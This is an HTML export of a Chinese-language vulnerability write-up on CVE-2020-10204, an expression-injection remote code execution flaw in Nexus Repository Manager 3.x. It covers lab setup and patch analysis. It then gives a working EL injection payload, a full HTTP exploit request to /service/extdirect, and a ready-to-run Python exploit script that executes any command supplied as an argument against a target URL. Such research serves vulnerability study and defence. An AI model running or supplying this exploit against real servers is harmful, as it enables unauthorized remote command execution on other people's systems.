<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xce3b6d7a35927857585156c8bc7ecf9891bab5b"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-10204</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Nexus Repository Manager </span><span class="csECDA2D3">远程执行代码漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">所有以前的</span><span class="cs8926E06">Nexus Repository Manager 3.x OSS / Pro</span><span class="cs9C1B1871">最高版本包括</span><span class="cs8926E06">3.21.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">下载</span><span class="cs8926E06">pull</span><span class="cs9C1B1871">下漏洞版本的</span><span class="cs8926E06">docker</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://hub.docker.com/r/sonatype/nexus3/tags</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker pull sonatype/nexus3:3.21.1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后切成</span><span class="cs8926E06">root</span><span class="cs9C1B1871">用户进入容器修改启动项</span><span class="cs8926E06">**/opt/sonatype/nexus/bin/nexus**</span></p><p class="cs3A447A38"><span class="cs9FB05234">run)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$INSTALL4J_JAVA_PREFIX exec &quot;$app_java_home/bin/java&quot; &nbsp;-Xdebug -server -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8888 -Dinstall4j.jvmDir=&quot;$app_java_home&quot; -Dexe4j.moduleName=&quot;$prg_dir/$progname&quot; &quot;-XX:+UnlockDiagnosticVMOptions&quot; &quot;-Dinstall4j.launcherId=245&quot; &quot;-Dinstall4j.swt=false&quot; &quot;$vmov_1&quot; &quot;$vmov_2&quot; &quot;$vmov_3&quot; &quot;$vmov_4&quot; &quot;$vmov_5&quot; $INSTALL4J_ADD_VM_PARAMS -classpath &quot;$local_classpath&quot; com.install4j.runtime.launcher.UnixLauncher run 9d17dc87 0 0 org.sonatype.nexus.karaf.NexusMain</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="241" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后在</span><span class="cs5BEC2C28">https://github.com/sonatype/nexus-public</span><span class="cs9C1B1871">下载源码</span><span class="cs8926E06">,</span><span class="cs9C1B1871">导入</span><span class="cs8926E06">idea,</span><span class="cs9C1B1871">然后配好远程配置连上去即可调试。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="264" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们先来</span><span class="cs8926E06">diff</span><span class="cs9C1B1871">一下</span><span class="cs8926E06">3.21.0</span><span class="cs9C1B1871">和</span><span class="cs8926E06">3.21.2</span><span class="cs9C1B1871">的区别</span><span class="cs8926E06">,</span><span class="cs9C1B1871">找一下官方修复的痕迹</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="290" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到有很明显的漏洞修复痕迹</span><span class="cs8926E06">,EL</span><span class="cs9C1B1871">表达式注入的限制被绕过了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其实我们看到测试文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">@Test</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public void testStripJavaEl_bugged_interpolator() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;String test = &quot;$\\A{badstuffinhere}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;String result = underTest.stripJavaEl(test);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;assertThat(result, is(&quot;{badstuffinhere}&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">也可以直接知道绕过方法</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这里我直接给我</span><span class="cs8926E06">rce</span><span class="cs9C1B1871">的</span><span class="cs8926E06">poc</span></p><p class="cs3A447A38"><span class="cs9FB05234">$\\A{&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/sssss&#39;)}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为什么增加了</span><span class="cs9FB05234">\A</span><span class="cs9C1B1871">还不影响表达式的解析呢</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这个我后面说</span><span class="cs8926E06">,</span><span class="cs9C1B1871">先构造出完整</span><span class="cs8926E06">poc</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么我们找一下哪些接口会使用</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="551" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到总过有三处</span><span class="cs8926E06">,</span><span class="cs9C1B1871">以第一处</span><span class="cs8926E06">Roles</span><span class="cs9C1B1871">为例</span><span class="cs8926E06">,</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="490" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以找到有多处注解使用的地方</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如说新建用户</span><span class="cs8926E06">/</span><span class="cs9C1B1871">更新用户</span><span class="cs8926E06">,</span><span class="cs9C1B1871">构造</span><span class="cs8926E06">Poc</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /service/extdirect HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 127.0.0.1:8081</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Nexus-UI: true</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">NX-ANTI-CSRF-TOKEN: 0.029301195082771514</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 350</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://127.0.0.1:8081/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: NX-ANTI-CSRF-TOKEN=0.029301195082771514; NXSESSIONID=7eaf0643-2707-445a-b17d-aedced6db8e5</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{&quot;action&quot;:&quot;coreui_User&quot;,&quot;method&quot;:&quot;create&quot;,&quot;data&quot;:[{&quot;userId&quot;:&quot;3&quot;,&quot;version&quot;:&quot;&quot;,&quot;firstName&quot;:&quot;test&quot;,&quot;lastName&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;,&quot;status&quot;:&quot;active&quot;,&quot;roles&quot;:[&quot;$\\X{&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/rce&#39;)}&quot;],&quot;password&quot;:&quot;admin&quot;}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:33}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="55" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">以及其他几处注解使用的地方</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">还有一个问题为什么增加</span><span class="cs9FB05234">\A</span><span class="cs9C1B1871">不会影响表达式的解析呢</span><span class="cs8926E06">?</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">/org/hibernate/validator/hibernate-validator/6.1.0.Final/hibernate-validator-6.1.0.Final.jar!/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class</span><span class="cs9C1B1871">对传入的字符串进行了两次处理</span><span class="cs8926E06">,</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">原本的字符串为</span><span class="cs9FB05234">Missing roles: [$\B{&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/rce&#39;)}]</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后第一次处理后的结果</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="416" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二次处理后的结果</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="167" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后解析的还是</span><span class="cs9FB05234">${xxxx}</span><span class="cs9C1B1871">这样子。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我在</span><span class="cs8926E06">3.21.1</span><span class="cs9C1B1871">版本测试</span><span class="cs9FB05234">$\\\B{}</span><span class="cs9C1B1871">这样也是可以执行的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">但是增加替换规则只是限制了</span><span class="cs9FB05234">A</span><span class="cs9C1B1871">啊</span><span class="cs8926E06">,</span><span class="cs9C1B1871">那这样不就还是可以绕过嘛</span><span class="cs8926E06">?</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="148" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后我启了一个</span><span class="cs9FB05234">3.21.2</span><span class="cs9C1B1871">版本的</span><span class="cs8926E06">docker,</span><span class="cs9C1B1871">测试发现并不行</span><span class="cs8926E06">,</span><span class="cs9C1B1871">很困惑</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这里我跟一下原因。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在我跟到</span><span class="cs9FB05234">/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class</span><span class="cs9C1B1871">发现大致调用堆栈是差不多的</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="247" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是再往下就有区别的</span><span class="cs8926E06">,3.21.0</span><span class="cs9C1B1871">版本调用了</span><span class="cs9FB05234">/org/hibernate/validator/messageinterpolation/ResourceBundleMessageInterpolator.class@InterpolationTerm</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而</span><span class="cs8926E06">3.21.2</span><span class="cs9C1B1871">版本调用的是</span><span class="cs9FB05234">/org/hibernate/validator/messageinterpolation/ParameterMessageInterpolator.class@InterpolationTerm</span><span class="cs8926E06">,</span><span class="cs9C1B1871">但是最开始的区别并不是这里</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这两个类都是继承了</span><span class="cs8926E06">AbstractMessageInterpolator,</span><span class="cs9C1B1871">然后重写的</span><span class="cs9FB05234">public String interpolate(Context context, Locale locale, String term)</span><span class="cs9C1B1871">方法不同</span><span class="cs8926E06">,</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">ParameterMessageInterpolator.class@InterpolationTerm</span><span class="cs9C1B1871">会进行表达式的检测</span></p><p class="cs3A447A38"><span class="cs9FB05234">public String interpolate(Context context, Locale locale, String term) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (InterpolationTerm.isElExpression(term)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.warnElIsUnsupported(term);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return term;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ParameterTermResolver parameterTermResolver = new ParameterTermResolver();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return parameterTermResolver.interpolate(context, term);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果表达式以</span><span class="cs9FB05234">$</span><span class="cs9C1B1871">开头</span><span class="cs8926E06">,</span><span class="cs9C1B1871">会直接打印</span><span class="cs8926E06">warning,</span><span class="cs9C1B1871">然后返回表达式字符串。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="54" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是这里是</span><span class="cs8926E06">hibernate</span><span class="cs9C1B1871">包中的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们需要去找到源头</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也就是</span><span class="cs8926E06">nexus</span><span class="cs9C1B1871">开发者是怎么去修复的呢</span><span class="cs8926E06">?</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在一阵搜索中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我在</span><span class="cs9FB05234">nexus-public-release-3.22.0-02/components/nexus-validation/src/main/java/org/sonatype/nexus/validation/ValidationModule.java</span><span class="cs9C1B1871">找到了</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2020-10204%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="217" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过搜索资料了解到</span><span class="cs8926E06">Hibernate Validator</span><span class="cs9C1B1871">提供了</span><span class="cs8926E06">ParameterMessageInterpolator</span><span class="cs9C1B1871">来处理消息</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并且不解析使用</span><span class="cs9FB05234">$</span><span class="cs9C1B1871">的表达式</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也就是说即使绕过了</span><span class="cs8926E06">replace</span><span class="cs9C1B1871">的地方</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也不会作为表达式进行解析</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而是直接返回了。</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">cve-2020-10204_cmd.py</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -*- coding:utf-8 -*-</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># author:zhzyker</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># from:https://github.com/zhzyker/exphub</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if len(sys.argv)!=4:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+---------------------------------------------------------------------------------------------------------+&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+ DES: by zhzyker as https://github.com/zhzyker/exphub &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2020-10204 Nexus Repository Manager 3 Remote Code Execution &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+---------------------------------------------------------------------------------------------------------+&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+ USE: python3 &lt;filename&gt; &lt;url&gt; &lt;session&gt; &lt;cmd&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+ EXP: python3 cve-2020-11444_exp.py http://ip:8081 6c012a5e-88d9-4f96-a05f-3790294dc49a &quot;touch /tmp/233&quot; +&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+ VER: Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;+---------------------------------------------------------------------------------------------------------+&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(0)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">vuln_url = url + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cmd = sys.argv[3]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;accept&#39;: &quot;application/json&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;User-Agent&#39;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;NX-ANTI-CSRF-TOKEN&#39;: &quot;0.856555763510765&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Content-Type&#39;: &quot;application/json&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Cookie&#39;: &quot;jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=&quot;+session+&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">data = &quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;action&quot;:&quot;coreui_Role&quot;,&quot;method&quot;:&quot;create&quot;,&quot;data&quot;:[{&quot;version&quot;:&quot;&quot;,&quot;source&quot;:&quot;default&quot;,&quot;id&quot;:&quot;1111&quot;,&quot;name&quot;:&quot;2222&quot;,&quot;description&quot;:&quot;3333&quot;,&quot;privileges&quot;:[&quot;$\\\A{&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(null).exec(&#39;%s&#39;)}&quot;],&quot;roles&quot;:[]}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:89}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot; % cmd</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">r = requests.post(url=vuln_url, headers=headers, data=data, timeout=20)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if r.status_code == 200:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &quot;UNIXProcess&quot; in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print (&quot;[+] Command Executed Successfully (Not Echo)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print (&quot;[-] Command Execution Failed&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print (&quot;[-] Target Not CVE-2020-10204 Vuln Good Luck&quot;)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7559</span></p></body>
</html>
